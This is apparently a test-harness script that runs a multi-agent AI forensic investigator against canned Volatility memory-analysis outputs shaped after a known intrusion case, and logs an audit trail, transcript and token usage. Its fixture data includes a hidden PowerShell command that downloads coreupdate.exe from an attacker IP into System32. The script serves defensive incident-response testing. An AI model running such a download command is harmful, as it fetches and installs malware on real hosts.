"""Live end-to-end run of the Lead Investigator graph (real models via OpenRouter).

The evidence layer is a canned Volatility scenario shaped after Case 001
("Stolen Szechuan Sauce" — coreupdate.exe, attacker 194.61.24.102, RDP ingress
on DC01), so this exercises REAL multi-agent autonomy — routing, tool use,
self-correction, the citation contract — without the not-yet-installed
Volatility binary. The first vol_malfind call is rigged to fail, probing live
self-correction at supervisor scale. Swapping in the real ToolRunner against
real evidence is deliverable 15.

Run:  uv run python scripts/live_supervisor_run.py
Env:  SPOOR_OPENROUTER_API_KEY (./.env), optional SPOOR_MODEL / SPOOR_LEAD_MODEL.

Artifacts land in runs/<stamp>-supervisor-live/ (committed: audit log, enforced
report, transcript, token usage — submission item #8).
"""

from __future__ import annotations

import json
import sys
from datetime import datetime, timezone
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from langchain_core.messages import HumanMessage

from spoor_sift.audit import AuditLog
from spoor_sift.model import build_chat_model, load_env
from spoor_sift.orchestration.supervisor import build_case_graph
from spoor_sift.runner import ToolResult

# ── Canned Volatility 3 scenario (raw renderer-JSON rows, Case-001-flavored) ──

_PROCESSES = [
    {"PID": 4, "PPID": 0, "ImageFileName": "System", "Threads": 132, "SessionId": None},
    {"PID": 264, "PPID": 4, "ImageFileName": "smss.exe", "Threads": 2, "SessionId": None},
    {"PID": 348, "PPID": 336, "ImageFileName": "csrss.exe", "Threads": 9, "SessionId": 0},
    {"PID": 500, "PPID": 336, "ImageFileName": "wininit.exe", "Threads": 1, "SessionId": 0},
    {"PID": 584, "PPID": 500, "ImageFileName": "services.exe", "Threads": 5, "SessionId": 0},
    {"PID": 592, "PPID": 500, "ImageFileName": "lsass.exe", "Threads": 7, "SessionId": 0},
    {"PID": 664, "PPID": 584, "ImageFileName": "svchost.exe", "Threads": 12, "SessionId": 0},
    {"PID": 728, "PPID": 584, "ImageFileName": "svchost.exe", "Threads": 19, "SessionId": 0},
    {"PID": 1320, "PPID": 584, "ImageFileName": "spoolsv.exe", "Threads": 10, "SessionId": 0},
    {"PID": 2244, "PPID": 2180, "ImageFileName": "explorer.exe", "Threads": 41, "SessionId": 1},
    {
        "PID": 4316, "PPID": 2244, "ImageFileName": "powershell.exe", "Threads": 14,
        "SessionId": 1, "CreateTime": "2020-09-19T02:21:47+00:00",
    },
    {
        "PID": 3644, "PPID": 4316, "ImageFileName": "coreupdate.exe", "Threads": 3,
        "SessionId": 1, "CreateTime": "2020-09-19T02:24:12+00:00",
    },
]

_NETSCAN = [
    {
        "Proto": "TCPv4", "LocalAddr": "10.42.85.10", "LocalPort": 3389,
        "ForeignAddr": "194.61.24.102", "ForeignPort": 51823, "State": "ESTABLISHED",
        "PID": 728, "Owner": "svchost.exe", "Created": "2020-09-19T02:19:33+00:00",
    },
    {
        "Proto": "TCPv4", "LocalAddr": "10.42.85.10", "LocalPort": 49723,
        "ForeignAddr": "194.61.24.102", "ForeignPort": 443, "State": "ESTABLISHED",
        "PID": 3644, "Owner": "coreupdate.exe", "Created": "2020-09-19T02:24:31+00:00",
    },
    {
        "Proto": "TCPv4", "LocalAddr": "0.0.0.0", "LocalPort": 445,
        "ForeignAddr": "0.0.0.0", "ForeignPort": 0, "State": "LISTENING",
        "PID": 4, "Owner": "System", "Created": None,
    },
]

_MALFIND = [
    {
        "PID": 3644, "Process": "coreupdate.exe", "Start VPN": "0x10000000",
        "End VPN": "0x10020fff", "Protection": "PAGE_EXECUTE_READWRITE", "Tag": "VadS",
    }
]

_CMDLINE = [
    {"PID": 2244, "Process": "explorer.exe", "Args": "C:\\Windows\\Explorer.EXE"},
    {
        "PID": 4316, "Process": "powershell.exe",
        "Args": 'powershell.exe -nop -w hidden -c "IWR http://194.61.24.102/coreupdate.exe '
                '-OutFile C:\\Windows\\System32\\coreupdate.exe"',
    },
    {"PID": 3644, "Process": "coreupdate.exe", "Args": "C:\\Windows\\System32\\coreupdate.exe -install"},
    {"PID": 664, "Process": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe -k LocalService"},
]

_BY_PLUGIN = {
    "windows.pslist": _PROCESSES,
    "windows.pstree": _PROCESSES,
    "windows.netscan": _NETSCAN,
    "windows.malfind": _MALFIND,
    "windows.cmdline": _CMDLINE,
}


class ScenarioRunner:
    """Canned Volatility outputs; the FIRST malfind call fails (self-correction probe)."""

    def __init__(self) -> None:
        self.malfind_calls = 0

    def run(self, binary: str, args: list[str]) -> ToolResult:
        plugin = args[-1]
        if plugin == "windows.malfind":
            self.malfind_calls += 1
            if self.malfind_calls == 1:
                return ToolResult(
                    1,
                    "",
                    "Volatility experienced a symbol-related issue: unable to validate the "
                    "plugin requirements (windows.malfind): missing symbol table for the "
                    "kernel layer. Re-running the plugin may succeed once symbols are cached.",
                )
        rows = _BY_PLUGIN.get(plugin)
        if rows is None:
            return ToolResult(2, "", f"unknown plugin {plugin}")
        return ToolResult(0, json.dumps(rows), "")


# ── Run ──────────────────────────────────────────────────────────────────────


def _summarize_tokens(messages) -> dict:
    seen: set[str] = set()
    totals = {"input_tokens": 0, "output_tokens": 0, "total_tokens": 0}
    by_model: dict[str, dict] = {}
    for msg in messages:
        usage = getattr(msg, "usage_metadata", None)
        if not usage or not msg.id or msg.id in seen:
            continue
        seen.add(msg.id)
        model = (getattr(msg, "response_metadata", None) or {}).get("model_name", "unknown")
        bucket = by_model.setdefault(model, {"input_tokens": 0, "output_tokens": 0, "total_tokens": 0, "llm_calls": 0})
        bucket["llm_calls"] += 1
        for key in ("input_tokens", "output_tokens", "total_tokens"):
            totals[key] += usage.get(key, 0)
            bucket[key] += usage.get(key, 0)
    return {"totals": totals, "by_model": by_model}


def _transcript(messages) -> str:
    lines = ["# Live supervisor run — transcript\n"]
    for msg in messages:
        who = msg.type + (f" [{msg.name}]" if getattr(msg, "name", None) else "")
        lines.append(f"## {who}")
        calls = getattr(msg, "tool_calls", None) or []
        for call in calls:
            lines.append(f"- tool_call → `{call['name']}` args={json.dumps(call['args'])[:200]}")
        content = msg.content if isinstance(msg.content, str) else json.dumps(msg.content)
        if content:
            lines.append("```\n" + content[:2000] + ("\n… [truncated]" if len(content) > 2000 else "") + "\n```")
        lines.append("")
    return "\n".join(lines)


def main() -> int:
    load_env()

    stamp = datetime.now(timezone.utc)
    run_dir = REPO / "runs" / f"{stamp:%Y-%m-%d-%H%M%S}-supervisor-live"
    run_dir.mkdir(parents=True, exist_ok=True)

    evidence_root = REPO / "evidence" / "case001"
    evidence_root.mkdir(parents=True, exist_ok=True)
    image = evidence_root / "citadeldc01.mem"
    image.write_bytes(b"SPOOR-CANNED-SCENARIO")  # stub: the runner is canned

    audit = AuditLog(run_dir / "audit.jsonl")
    runner = ScenarioRunner()
    specialist = build_chat_model("specialist")
    lead = build_chat_model("lead")
    graph = build_case_graph(
        runner=runner,
        audit=audit,
        evidence_root=evidence_root,
        lead_model=lead,
        triage_model=specialist,
        ioc_model=specialist,
        reporter_model=specialist,
    )

    thread_id = f"case001-live-{stamp:%Y%m%dT%H%M%SZ}"
    config = {"configurable": {"thread_id": thread_id}, "recursion_limit": 80}
    brief = (
        "Investigate the Windows memory image 'citadeldc01.mem' from host DC01 (10.42.85.10), "
        "a domain controller suspected of compromise. Determine whether the host is compromised, "
        "how the attacker got in, what was executed, and any indicators of compromise. "
        "Work the case to completion and deliver the final report through the reporter."
    )

    print(f"thread: {thread_id}")
    print(f"lead model: {getattr(lead, 'model_name', getattr(lead, 'model', '?'))}")
    print(f"specialist model: {getattr(specialist, 'model_name', getattr(specialist, 'model', '?'))}\n")

    def _stream(inputs) -> dict | None:
        state = None
        for mode, chunk in graph.stream(inputs, config, stream_mode=["updates", "values"]):
            if mode == "updates":
                for node, update in chunk.items():
                    messages = (update or {}).get("messages", [])
                    last = messages[-1] if messages else None
                    calls = [c["name"] for c in (getattr(last, "tool_calls", None) or [])]
                    if calls:
                        print(f"▶ {node}  → {', '.join(calls)}")
                    else:
                        head = (getattr(last, "content", "") or "")[:120]
                        print(f"▶ {node}  {head!r}")
            else:
                state = chunk
        return state

    final_state = _stream(
        {"messages": [HumanMessage(brief)], "evidence": {"memory_image": "citadeldc01.mem"}}
    )

    # Completeness gate (deterministic, not prompt-based): the case cannot conclude
    # without an enforced report. If the lead wandered off, re-engage it on the same
    # checkpointed thread — autonomy with a hard invariant, no human in the loop.
    gate_engagements = 0
    while (not final_state or not final_state.get("report")) and gate_engagements < 2:
        gate_engagements += 1
        print(f"\n⛔ completeness gate: no enforced report — re-engaging supervisor "
              f"(attempt {gate_engagements})")
        final_state = _stream(
            {
                "messages": [
                    HumanMessage(
                        "PROTOCOL VIOLATION: the case ended without the reporter's enforced "
                        "report. Transfer to the reporter NOW so it can compile and submit "
                        "the report via submit_report. The case is not complete until then."
                    )
                ]
            }
        )

    report = (final_state or {}).get("report")
    chain = audit.verify()

    # self-correction evidence: malfind failed once, then succeeded
    malfind = [r for r in audit.records() if r.tool == "vol_malfind"]
    self_corrected = len(malfind) >= 2 and malfind[0].exit_code != 0 and any(
        r.exit_code == 0 for r in malfind[1:]
    )

    # Artifacts are written unconditionally — a failed run must stay inspectable.
    messages = (final_state or {}).get("messages", [])
    (run_dir / "transcript.md").write_text(_transcript(messages))
    tokens = _summarize_tokens(messages)
    (run_dir / "token_usage.json").write_text(json.dumps(tokens, indent=2))
    if report:
        (run_dir / "report.json").write_text(json.dumps(report, indent=2, ensure_ascii=False))
    (run_dir / "run_meta.json").write_text(
        json.dumps(
            {
                "thread_id": thread_id,
                "started_utc": stamp.isoformat(),
                "finished_utc": datetime.now(timezone.utc).isoformat(),
                "lead_model": getattr(lead, "model_name", getattr(lead, "model", None)),
                "specialist_model": getattr(specialist, "model_name", getattr(specialist, "model", None)),
                "message_count": len(messages),
                "completeness_gate_engagements": gate_engagements,
                "audit_records": len(audit.records()),
                "audit_chain_ok": chain.ok,
                "self_correction_observed": self_corrected,
                "scenario": "canned Case-001-flavored Volatility outputs (see script header)",
            },
            indent=2,
        )
    )

    if not report:
        print(f"\nFAILED: no enforced report after {gate_engagements} gate engagement(s); "
              f"see {run_dir.relative_to(REPO)}/transcript.md", file=sys.stderr)
        return 1

    enforcement = report["enforcement"]
    print("\n── ENFORCED REPORT ──")
    print(f"executive summary: {report['executive_summary'][:300]}")
    for finding in report["findings"]:
        mark = "✔ confirmed" if finding["status"] == "confirmed" else "○ inferred"
        reason = f"  [downgraded: {finding['downgraded_reason']}]" if finding.get("downgraded_reason") else ""
        print(f"  {mark}: {finding['claim'][:140]}{reason}")
    print(f"iocs: {[(i['type'], i['value']) for i in report['iocs']]}")
    print(f"enforcement: {enforcement}")
    print(f"report sealed as audit record: {report['report_audit_id'][:16]}…")
    print(f"audit chain: {'OK' if chain.ok else 'BROKEN — ' + str(chain.reason)} ({len(audit.records())} records)")
    print(f"self-correction (malfind fail→retry→success): {'OBSERVED' if self_corrected else 'not observed'}")
    print(f"tokens: {tokens['totals']}")
    print(f"\nartifacts: {run_dir.relative_to(REPO)}/")

    ok = chain.ok and enforcement["audit_chain_ok"]
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
